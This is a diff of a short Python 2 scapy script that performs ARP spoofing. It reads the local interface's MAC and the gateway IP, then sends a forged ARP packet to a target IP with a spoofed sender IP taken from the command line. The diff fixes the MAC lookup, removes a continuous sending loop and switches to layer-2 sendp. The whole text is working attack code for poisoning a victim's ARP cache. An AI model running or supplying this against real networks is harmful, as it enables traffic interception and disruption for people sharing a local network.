@@ -8,10 +8,10 @@ if len(sys.argv) != 3:
     sys.exit(1)
 
 ifName = netifaces.interfaces()
-ifName = ifName[2]
+ifName = ifName[1]
 
 ifInfo = netifaces.ifaddresses(ifName)
-ifMAC = ifInfo[-1000][0]['addr']
+ifMAC = ifInfo[17][0]['addr']
 ifIP = ifInfo[2][0]['addr']
 
 print "[*] My Interface Name : ", ifName
@@ -23,9 +23,6 @@ gateIP = gateInfo['default'][2][0]
 print "[*] Gateway Info : ", gateInfo
 print "[*] Gateway IP : ", gateIP
 
-broadIP = ifIP.replace("."+ifIP.split('.')[-1], '')+".255"
-print "[*] Broadcast IP : ", broadIP
-
-while True:
-    packet = Ether()/ARP(op="who-has",hwsrc=ifMAC,psrc=sys.argv[2],pdst=sys.argv[1])
-    send(packet)
+packet = Ether()/ARP(op="who-has",hwsrc=ifMAC,psrc=sys.argv[2],pdst=sys.argv[1])
+sendp(packet)
+	
